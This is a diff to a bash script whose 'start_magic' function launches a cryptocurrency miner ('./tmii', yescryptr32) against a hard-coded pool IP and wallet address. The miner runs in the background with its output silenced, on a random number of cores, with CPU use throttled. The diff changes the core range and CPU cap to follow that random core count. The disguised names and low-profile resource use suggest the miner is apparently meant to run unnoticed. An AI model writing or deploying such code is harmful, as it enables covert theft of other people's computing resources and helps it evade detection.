@@ -30,17 +30,19 @@ start_magic() {
   local num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
   local worker=$(generate_worker $num_cores)  # Generate worker string including core count
 
-  # Define the cores to use (for example, using the first 20 cores)
-  local cores_to_use="0-19"  # Modify this range if you want a different set of cores
+  # Define the cores to use
+  local cores_to_use="0-$(($num_cores - 1))"  # Using the first $num_cores cores
 
+  # Calculate the CPU limit as a percentage
+  local cpu_limit=$(( 100 * num_cores / total_cores ))  # Calculate percentage based on num_cores
+  
   # Start the mining process with core affinity
   taskset -c $cores_to_use nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
   local pid=$!
 
   echo "Magic started with PID: $pid using $num_cores cores"
 
-  # Limiting CPU usage to 95% of the allocated cores
-  local cpu_limit=95
+  # Limiting CPU usage using `cpulimit`
   cpulimit -p $pid -l $cpu_limit &
   
   # Save PID to a file for later use
